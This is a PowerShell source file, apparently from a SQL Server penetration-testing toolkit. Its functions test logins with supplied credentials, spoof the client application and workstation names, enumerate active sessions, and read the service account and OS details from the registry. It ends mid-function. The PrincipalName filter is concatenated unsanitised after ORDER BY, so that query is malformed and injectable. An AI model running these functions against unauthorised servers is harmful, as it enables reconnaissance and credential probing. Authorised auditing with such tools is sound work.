#get-sqlsysadmincheck, get-sqlconnectiontest, get-sqlserverinfo, get-sqlsession

Function Get-SQLConnectionObject
{
    <#
            .SYNOPSIS
            Creates a object for connecting to SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER AppName
            Spoof the name of the application you are connecting to SQL Server with.
            .PARAMETER WorkstationId
            Spoof the name of the workstation/hostname you are connecting to SQL Server with.
            .PARAMETER Encrypt
            Use an encrypted connection.
            .PARAMETER TrustServerCert
            Trust the certificate of the remote server.
            .EXAMPLE
            PS C:\> Get-SQLConnectionObject -Username myuser -Password mypass -Instance server1 -Encrypt Yes -TrustServerCert Yes -AppName "myapp"
            StatisticsEnabled                : False
            AccessToken                      :
            ConnectionString                 : Server=server1;Database=Master;User ID=myuser;Password=mypass;Connection Timeout=1 ;Application
                                               Name="myapp";Encrypt=Yes;TrustServerCertificate=Yes
            ConnectionTimeout                : 1
            Database                         : Master
            DataSource                       : server1
            PacketSize                       : 8000
            ClientConnectionId               : 00000000-0000-0000-0000-000000000000
            ServerVersion                    :
            State                            : Closed
            WorkstationId                    : Workstation1
            Credential                       :
            FireInfoMessageEventOnUserErrors : False
            Site                             :
            Container                        :
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )

    Begin
    {
        # Setup DAC string
        if($DAC)
        {
            $DacConn = 'ADMIN:'
        }
        else
        {
            $DacConn = ''
        }

        # Set database filter
        if(-not $Database)
        {
            $Database = 'Master'
        }

        # Check if appname was provided
        if($AppName){
            $AppNameString = ";Application Name=`"$AppName`""
        }else{
            $AppNameString = ""
        }

        # Check if workstationid was provided
        if($WorkstationId){
            $WorkstationString = ";Workstation Id=`"$WorkstationId`""
        }else{
            $WorkstationString = ""
        }

        # Check if encrypt was provided
        if($Encrypt){
            $EncryptString = ";Encrypt=Yes"
        }else{
            $EncryptString = ""
        }

        # Check TrustServerCert was provided
        if($TrustServerCert){
            $TrustCertString = ";TrustServerCertificate=Yes"
        }else{
            $TrustCertString = ""
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection

        # Set authentcation type - current windows user
        if(-not $Username){

            # Set authentication type
            $AuthenticationType = "Current Windows Credentials"

            # Set connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Set authentcation type - provided windows user
        if ($username -like "*\*"){
            $AuthenticationType = "Provided Windows Credentials"

            # Setup connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Set authentcation type - provided sql login
        if (($username) -and ($username -notlike "*\*")){

            # Set authentication type
            $AuthenticationType = "Provided SQL Login"

            # Setup connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Return the connection object
        return $Connection
    }

    End
    {
    }
}

Function  Get-SQLConnectionTest
{
    <#
            .SYNOPSIS
            Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER Database
            Default database to connect to.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
            .EXAMPLE
            PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'IP Address of SQL Server.')]
        [string]$IPAddress,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP Address Range In CIDR Format to Audit.')]
        [string]$IPRange,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('Status')
    }

    Process
    {
        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        # Split Demarkation Start ^
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        <#
        if($IPRange -and $IPAddress)
        {
            <# if ($IPAddress.Contains(","))
            {
                $ContainsValid = $false
                foreach ($IP in $IPAddress.Split(","))
                {
                    if($(Test-Subnet -cidr $IPRange -ip $IP))
                    {
                        $ContainsValid = $true
                    }
                }
                if (-not $ContainsValid)
                {
                    Write-Warning "Skipping $ComputerName ($IPAddress)"
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                    return
                }
            }

            if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
            {
                Write-Warning "Skipping $ComputerName ($IPAddress)"
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                return
            }
            Write-Verbose "$ComputerName ($IPAddress)"
        } #>

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()

            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()
        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                Write-Verbose  -Message " Error: $ErrorMessage"
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Return Results
        $TblResults
    }
}

# ----------------------------------
#  Get-SQLSession
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLSession
{
    <#
            .SYNOPSIS
            Returns active sessions from target SQL Servers.  Sysadmin privileges is required to view all sessions.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLSession -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1

            ComputerName          : SQLServer1
            Instance              : SQLServer1\STANDARDDEV2014
            PrincipalSid          : 010500000000000515000000F3864312345716CC636051C017100000
            PrincipalName         : Domain\MyUser
            OriginalPrincipalName : Domain\MyUser
            SessionId             : 51
            SessionStartTime      : 06/24/2016 09:26:21
            SessionLoginTime      : 06/24/2016 09:26:21
            SessionStatus         : running
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLSession -Verbose
            .EXAMPLE
            PS C:\> (Get-SQLSession -Instance SQLServer1\STANDARDDEV2014).count
            48
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'PrincipalName.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblSessions = New-Object -TypeName System.Data.DataTable
        $null = $TblSessions.Columns.Add('ComputerName')
        $null = $TblSessions.Columns.Add('Instance')
        $null = $TblSessions.Columns.Add('PrincipalSid')
        $null = $TblSessions.Columns.Add('PrincipalName')
        $null = $TblSessions.Columns.Add('OriginalPrincipalName')
        $null = $TblSessions.Columns.Add('SessionId')
        $null = $TblSessions.Columns.Add('SessionStartTime')
        $null = $TblSessions.Columns.Add('SessionLoginTime')
        $null = $TblSessions.Columns.Add('SessionStatus')

        # Setup PrincipalName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and login_name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to view sessions that aren't yours.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  USE master;
            SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            security_id as [PrincipalSid],
            login_name as [PrincipalName],
            original_login_name as [OriginalPrincipalName],
            session_id as [SessionId],
            last_request_start_time as [SessionStartTime],
            login_time as [SessionLoginTime],
            status as [SessionStatus]
            FROM    [sys].[dm_exec_sessions]
            ORDER BY status
        $PrincipalNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each record
        $TblResults |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblSessions.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                $Sid,
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
            [string]$_.SessionStatus)
        }
    }

    End
    {
        # Return data
        $TblSessions
    }
}

# ----------------------------------
#  Get-SQLServerInfo
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerInfo
{
    <#
            .SYNOPSIS
            Returns basic server and user information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .EXAMPLE
            PS C:\> Get-SQLServerInfo -Instance SQLServer1\STANDARDDEV2014

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DomainName             : Domain
            ServiceProcessId       : 6758
            ServiceName            : MSSQL$STANDARDDEV2014
            ServiceAccount         : LocalSystem
            AuthenticationMode     : Windows and SQL Server Authentication
            Clustered              : No
            SQLServerVersionNumber : 12.0.4213.0
            SQLServerMajorVersion  : 2014
            SQLServerEdition       : Developer Edition (64-bit)
            SQLServerServicePack   : SP1
            OSArchitecture         : X64
            OsMachineType          : WinNT
            OSVersionName          : Windows 8.1 Pro
            OsVersionNumber        : 6.3
            Currentlogin           : Domain\MyUser
            IsSysadmin             : Yes
            ActiveSessions         : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerInfo -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get number of active sessions for server
        $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
        Where-Object -FilterScript {
            $_.SessionStatus -eq 'running'
        } |
        Measure-Object -Line |
        Select-Object -Property Lines -ExpandProperty Lines

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($IsSysadmin -eq 'Yes')
        {
            # Grab additional information if sysadmin
            $SysadminSetup = "
                -- Get machine type
                DECLARE @MachineType  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                @value_name		= N'ProductType',
                @value			= @MachineType output

                -- Get OS version
                DECLARE @ProductName  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                @value_name		= N'ProductName',
            @value			= @ProductName output"

            $SysadminQuery = '  @MachineType as [OsMachineType],
            @ProductName as [OSVersionName],'
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }

        # Define Query
        $Query = "  -- Get SQL Server Information

            -- Get SQL Server Service Name and Path
            DECLARE @SQLServerInstance varchar(250)
            DECLARE @SQLServerServiceName varchar(250)
            if @@SERVICENAME = 'MSSQLSERVER'
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @SQLServerServiceName = 'MSSQLSERVER'
            END
            ELSE
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
            END

            -- Get SQL Server Service Account
            DECLARE @ServiceaccountName varchar(250)
            EXECUTE master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

            -- Get authentication mode
            DECLARE @AuthenticationMode INT
            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
            N'Software\Microsoft\MSSQLServer\MSSQLServer',
            N'LoginMode', @AuthenticationMode OUTPUT

            -- Get the forced encryption flag
            BEGIN TRY
	            DECLARE @ForcedEncryption INT
	            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
	            N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
	            N'ForceEncryption', @ForcedEncryption OUTPUT
            END TRY
            BEGIN CATCH
            END CATCH

            -- Grab additional information as sysadmin
            $SysadminSetup

            -- Return server and version information
            SELECT  '$ComputerName' as [ComputerName],
            @@servername as [Instance],
            DEFAULT_DOMAIN() as [DomainName],
            SERVERPROPERTY('processid') as ServiceProcessID,
            @SQLServerServiceName as [ServiceName],
            @ServiceAccountName as [ServiceAccount],
            (SELECT CASE @AuthenticationMode
            WHEN 1 THEN 'Windows Authentication'
            WHEN 2 THEN 'Windows and SQL Server Authentication'
            ELSE 'Unknown'
            END) as [AuthenticationMode],
            @ForcedEncryption as ForcedEncryption,
            CASE  SERVERPROPERTY('IsClustered')
            WHEN 0
            THEN 'No'
            ELSE 'Yes'
            END as [Clustered],
            SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
            SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
            serverproperty('Edition') as [SQLServerEdition],
            SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
            SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
            $SysadminQuery
            RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
            SYSTEM_USER as [Currentlogin],
            '$IsSysadmin' as [IsSysadmin],
        '$ActiveSessions' as [ActiveSessions]"
        # Execute Query
        $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblServerInfo = $TblServerInfo + $TblServerInfoTemp
    }

    End
    {
        # Return data
        $TblServerInfo
    }
}


function Invoke-Parallel
{
    <#
            .SYNOPSIS
            Function to control parallel processing using runspaces

            .DESCRIPTION
            Function to control parallel processing using runspaces

            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.
            This behaviour can be changed with parameters.

            .PARAMETER ScriptFile
            File to run against all input objects.  Must include parameter to take in the input object, or use $args.  Optionally, include parameter to take in parameter.  Example: C:\script.ps1

            .PARAMETER ScriptBlock
            Scriptblock to run against all computers.

            You may use $Using:<Variable> language in PowerShell 3 and later.

            The parameter block is added for you, allowing behaviour similar to foreach-object:
            Refer to the input object as $_.
            Refer to the parameter parameter as $parameter

            .PARAMETER InputObject
            Run script against these specified objects.

            .PARAMETER Parameter
            This object is passed to every script block.  You can use it to pass information to the script block; for example, the path to a logging folder

            Reference this object as $parameter if using the scriptblock parameterset.

            .PARAMETER ImportVariables
            If specified, get user session variables and add them to the initial session state

            .PARAMETER ImportModules
            If specified, get loaded modules and pssnapins, add them to the initial session state

            .PARAMETER Throttle
            Maximum number of threads to run at a single time.

            .PARAMETER SleepTimer
            Milliseconds to sleep after checking for completed runspaces and in a few other spots.  I would not recommend dropping below 200 or increasing above 500

            .PARAMETER RunspaceTimeout
            Maximum time in seconds a single thread can run.  If execution of your code takes longer than this, it is disposed.  Default: 0 (seconds)

            WARNING:  Using this parameter requires that maxQueue be set to throttle (it will be by default) for accurate timing.  Details here:
            http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430

            .PARAMETER NoCloseOnTimeout
            Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out. This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.

            .PARAMETER MaxQueue
            Maximum number of powershell instances to add to runspace pool.  If this is higher than $throttle, $timeout will be inaccurate

            If this is equal or less than throttle, there will be a performance impact

            The default value is $throttle times 3, if $runspaceTimeout is not specified
            The default value is $throttle, if $runspaceTimeout is specified

            .PARAMETER LogFile
            Path to a file where we can log results, including run time for each thread, whether it completes, completes with errors, or times out.

            .PARAMETER Quiet
            Disable progress bar.

            .EXAMPLE
            Each example uses Test-ForPacs.ps1 which includes the following code:
            param($computer)

            if(test-connection $computer -count 1 -quiet -BufferSize 16){
            $object = [pscustomobject] @{
            Computer=$computer;
            Available=1;
            Kodak=$(
            if((test-path "\\$computer\c$\users\public\desktop\Kodak Direct View Pacs.url") -or (test-path "\\$computer\c$\documents and settings\all users

            \desktop\Kodak Direct View Pacs.url") ){"1"}else{"0"}
            )
            }
            }
            else{
            $object = [pscustomobject] @{
            Computer=$computer;
            Available=0;
            Kodak="NA"
            }
            }

            $object

            .EXAMPLE
            Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject $(get-content C:\pcs.txt) -runspaceTimeout 10 -throttle 10

            Pulls list of PCs from C:\pcs.txt,
            Runs Test-ForPacs against each
            If any query takes longer than 10 seconds, it is disposed
            Only run 10 threads at a time

            .EXAMPLE
            Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject c-is-ts-91, c-is-ts-95

            Runs against c-is-ts-91, c-is-ts-95 (-computername)
            Runs Test-ForPacs against each

            .EXAMPLE
            $stuff = [pscustomobject] @{
            ContentFile = "windows\system32\drivers\etc\hosts"
            Logfile = "C:\temp\log.txt"
            }

            $computers | Invoke-Parallel -parameter $stuff {
            $contentFile = join-path "\\$_\c$" $parameter.contentfile
            Get-Content $contentFile |
            set-content $parameter.logfile
            }

            This example uses the parameter argument.  This parameter is a single object.  To pass multiple items into the script block, we create a custom object (using a PowerShell v3 language) with properties we want to pass in.

            Inside the script block, $parameter is used to reference this parameter object.  This example sets a content file, gets content from that file, and sets it to a predefined log file.

            .EXAMPLE
            $test = 5
            1..2 | Invoke-Parallel -ImportVariables {$_ * $test}

            Add variables from the current session to the session state.  Without -ImportVariables $Test would not be accessible

            .EXAMPLE
            $test = 5
            1..2 | Invoke-Parallel {$_ * $Using:test}

            Reference a variable from the current session with the $Using:<Variable> syntax.  Requires PowerShell 3 or later. Note that -ImportVariables parameter is no longer necessary.

            .FUNCTIONALITY
            PowerShell Language

            .NOTES
            Credit to Boe Prox for the base runspace code and $Using implementation
            http://learn-powershell.net/2012/05/10/speedy-network-information-query-using-powershell/
            http://gallery.technet.microsoft.com/scriptcenter/Speedy-Network-Information-5b1406fb#content
            https://github.com/proxb/PoshRSJob/

            Credit to T Bryce Yehl for the Quiet and NoCloseOnTimeout implementations

            Credit to Sergei Vorobev for the many ideas and contributions that have improved functionality, reliability, and ease of use

            .LINK
            https://github.com/RamblingCookieMonster/Invoke-Parallel
    #>
    [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory = $false,ParameterSetName = 'ScriptFile')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        $ScriptFile,

        [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,

        [PSObject]$Parameter,

        [switch]$ImportSessionFunctions,

        [switch]$ImportVariables,

        [switch]$ImportModules,

        [int]$Throttle = 20,

        [int]$SleepTimer = 200,

        [int]$RunspaceTimeout = 0,

        [switch]$NoCloseOnTimeout = $false,

        [int]$MaxQueue,

        [validatescript({
                    Test-Path (Split-Path -Path $_ -Parent)
        })]
        [string]$LogFile = 'C:\temp\log.log',

        [switch] $Quiet = $false
    )

    Begin {

        #No max queue specified?  Estimate one.
        #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
        {
            if($RunspaceTimeout -ne 0)
            {
                $script:MaxQueue = $Throttle
            }
            else
            {
                $script:MaxQueue = $Throttle * 3
            }
        }
        else
        {
            $script:MaxQueue = $MaxQueue
        }

        #Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
        if ($ImportVariables -or $ImportModules)
        {
            $StandardUserEnv = [powershell]::Create().addscript({
                    #Get modules and snapins in this clean runspace
                    $Modules = Get-Module | Select-Object -ExpandProperty Name
                    $Snapins = Get-PSSnapin | Select-Object -ExpandProperty Name

                    #Get variables in this clean runspace
                    #Called last to get vars like $? into session
                    $Variables = Get-Variable | Select-Object -ExpandProperty Name

                    #Return a hashtable where we can access each.
                    @{
                        Variables = $Variables
                        Modules   = $Modules
                        Snapins   = $Snapins
                    }
            }).invoke()[0]

            if ($ImportVariables)
            {
                #Exclude common parameters, bound parameters, and automatic variables
                Function _temp
                {
                    [cmdletbinding()] param()
                }
                $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                #Write-Verbose "Excluding variables $( ($VariablesToExclude | sort ) -join ", ")"

                # we don't use 'Get-Variable -Exclude', because it uses regexps.
                # One of the veriables that we pass is '$?'.
                # There could be other variables with such problems.
                # Scope 2 required if we move to a real module
                $UserVariables = @( Get-Variable | Where-Object -FilterScript {
                        -not ($VariablesToExclude -contains $_.Name)
                } )
                #Write-Verbose "Found variables to import: $( ($UserVariables | Select -expandproperty Name | Sort ) -join ", " | Out-String).`n"
            }

            if ($ImportModules)
            {
                $UserModules = @( Get-Module |
                    Where-Object -FilterScript {
                        $StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path -Path $_.Path -ErrorAction SilentlyContinue)
                    } |
                Select-Object -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin |
                    Select-Object -ExpandProperty Name |
                    Where-Object -FilterScript {
                        $StandardUserEnv.Snapins -notcontains $_
                } )
            }
        }

        #region functions

        Function Get-RunspaceData
        {
            [cmdletbinding()]
            param( [switch]$Wait )

            #loop through runspaces
            #if $wait is specified, keep looping until all complete
            Do
            {
                #set more to false for tracking completion
                $more = $false

                #Progress bar if we have inputobject count (bound parameter)
                if (-not $Quiet)
                {
                    Write-Progress  -Activity 'Running Query' -Status 'Starting threads'`
                    -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                    -PercentComplete $( Try
                        {
                            $script:completedCount / $totalCount * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }

                #run through each runspace.
                Foreach($runspace in $runspaces)
                {
                    #get the duration - inaccurate
                    $currentdate = Get-Date
                    $runtime = $currentdate - $runspace.startTime
